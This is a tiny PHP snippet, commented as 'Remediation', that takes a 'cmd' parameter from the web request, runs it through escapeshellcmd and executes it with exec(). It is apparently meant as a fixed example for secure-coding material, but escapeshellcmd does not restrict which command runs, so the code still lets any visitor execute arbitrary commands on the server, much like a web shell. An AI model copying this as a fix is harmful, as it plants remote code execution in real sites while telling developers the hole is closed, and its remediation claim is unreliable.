<?php 
// Remediation
$cmd = $_REQUEST['cmd'];
$cmd = escapeshellcmd($cmd);
exec($cmd);

?> 
